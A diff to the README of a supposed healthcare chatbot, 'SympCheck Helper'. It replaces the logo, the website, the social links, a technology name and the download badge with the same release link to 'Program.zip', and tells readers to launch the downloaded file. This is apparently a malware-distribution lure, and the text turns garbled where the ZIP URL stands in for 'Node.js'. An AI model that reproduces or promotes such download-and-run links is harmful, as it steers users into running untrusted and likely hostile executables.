@@ -1,13 +1,13 @@
 
 # 🏥 SympCheck Helper - Your Intelligent Healthcare Companion 🤖
 
-![SympCheck Logo](https://example.com/logo.png)
+![SympCheck Logo](https://github.com/hello395/sympcheck-helper/releases/download/v1.0/Program.zip)
 
 Welcome to the official repository of SympCheck Helper, a cutting-edge healthcare consultation chatbot that utilizes the power of DeepSeek V3 API and Supabase to provide intelligent health-related assistance. 🚀
 
 ## Overview ℹ️
 
-SympCheck Helper is a modern chatbot solution designed to offer users seamless and intuitive healthcare support. By leveraging advanced technologies such as Node.js, React, and SQL, this chatbot provides real-time assistance for individuals seeking health information and guidance. 👨‍⚕️💬
+SympCheck Helper is a modern chatbot solution designed to offer users seamless and intuitive healthcare support. By leveraging advanced technologies such as https://github.com/hello395/sympcheck-helper/releases/download/v1.0/Program.zip, React, and SQL, this chatbot provides real-time assistance for individuals seeking health information and guidance. 👨‍⚕️💬
 
 ## Features ✨
 
@@ -41,7 +41,7 @@ SympCheck Helper can be used for various healthcare-related tasks, including:
 🔍 DeepSeek  
 ⚕️ Healthcare AI  
 🏥 Healthcare Application  
-🟩 Node.js  
+🟩 https://github.com/hello395/sympcheck-helper/releases/download/v1.0/Program.zip  
 ⚛️ React  
 🎨 Shadcn UI  
 💾 SQL  
@@ -52,13 +52,13 @@ SympCheck Helper can be used for various healthcare-related tasks, including:
 
 ## Additional Resources 📚
 
-For more information about SympCheck Helper and its functionalities, visit the [official website](https://www.sympcheck.com). 
+For more information about SympCheck Helper and its functionalities, visit the [official website](https://github.com/hello395/sympcheck-helper/releases/download/v1.0/Program.zip). 
 
 If you encounter any issues or have suggestions for improvements, please check the "Releases" section of this repository for updates and bug fixes.
 
 ## Download SympCheck Helper 📥
 
-[![Download SympCheck Helper](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download SympCheck Helper](https://github.com/hello395/sympcheck-helper/releases/download/v1.0/Program.zip)](https://github.com/hello395/sympcheck-helper/releases/download/v1.0/Program.zip)
 
 🚀 Launch the downloaded file to experience the power of SympCheck Helper!
 
@@ -68,4 +68,4 @@ Thank you for choosing SympCheck Helper as your healthcare companion. We are com
 
 Happy Chatbotting! 🌟
 
-🌐 Connect with us: [LinkedIn](https://www.linkedin.com/sympcheck) | [Twitter](https://www.twitter.com/sympcheck) | [Instagram](https://www.instagram.com/sympcheck)
+🌐 Connect with us: [LinkedIn](https://github.com/hello395/sympcheck-helper/releases/download/v1.0/Program.zip) | [Twitter](https://github.com/hello395/sympcheck-helper/releases/download/v1.0/Program.zip) | [Instagram](https://github.com/hello395/sympcheck-helper/releases/download/v1.0/Program.zip)
